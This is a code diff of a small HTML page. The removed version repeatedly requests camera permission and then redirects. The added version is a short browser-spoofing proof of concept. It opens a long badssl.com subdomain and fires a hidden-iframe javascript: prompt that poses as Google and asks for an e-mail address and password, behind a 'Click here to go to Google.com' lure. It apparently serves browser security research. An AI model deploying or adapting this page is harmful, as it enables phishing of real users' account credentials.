@@ -1,99 +1,22 @@
-<!doctype html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>Camera permission request</title>
-  <style>
-    /* small niceties */
-    #cameraPreview {
-      position: fixed;
-      right: 10px;
-      bottom: 10px;
-      width: 160px;
-      height: 120px;
-      border: 1px solid #ccc;
-      background: #000;
-      display: none;
-      z-index: 9999;
-    }
-    #openBtn {
-      padding: 8px 12px;
-      cursor: pointer;
-    }
-    #status {
-      margin-top: 20px;
-      padding: 10px;
-      background: #f0f0f0;
-      border-radius: 4px;
-    }
-  </style>
-</head>
-<body>
-  <a href="#" id="openBtn">Start Camera Permission Requests</a>
-  <div id="status"></div>
-  <!-- hidden video element for camera preview -->
-  <video id="cameraPreview" autoplay muted playsinline></video>
-  <script>
-    let requestInterval = null;
-    let currentStream = null;
-    
-    // stop camera stream and hide preview
-    function stopCamera() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-        currentStream = null;
-      }
-      document.getElementById('cameraPreview').style.display = 'none';
+  <body>
+
+    <script>
+
+    function exploit() {
+      window.open("https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/");
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
     }
     
-    // request camera access, then redirect
-    function start() {
-      const video = document.getElementById('cameraPreview');
-      const status = document.getElementById('status');
-      
-      // Stop previous stream if any
-      stopCamera();
-      
-      // Request camera
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(stream) {
-          currentStream = stream;
-          video.srcObject = stream;
-          video.style.display = 'block';
-          status.textContent = 'Camera permission granted at ' + new Date().toLocaleTimeString();
-          status.style.background = '#d4edda';
-        })
-        .catch(function(err) {
-          status.textContent = 'Camera access denied at ' + new Date().toLocaleTimeString() + ': ' + err.message;
-          status.style.background = '#f8d7da';
-          console.error('Camera access denied:', err);
-        });
-      
-      // Redirect after a short delay to allow permissions to be requested
-      setTimeout(function() {
-        document.location = "https://www.google.com";
-      }, 500);
-    }
-    
-    // attach click handler
-    document.getElementById('openBtn').addEventListener('click', function(e) {
-      e.preventDefault();
-      
-      if (requestInterval) {
-        // Stop the interval if already running
-        clearInterval(requestInterval);
-        requestInterval = null;
-        stopCamera();
-        this.textContent = 'Start Camera Permission Requests';
-        document.getElementById('status').textContent = 'Stopped requesting permissions';
-        document.getElementById('status').style.background = '#f0f0f0';
-      } else {
-        // Start requesting permissions every 1 second
-        this.textContent = 'Stop Camera Permission Requests';
-        start(); // Request immediately
-        requestInterval = setInterval(start, 1000); // Then every 1 second
-      }
-    });
-  </script>
-</body>
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
 </html>
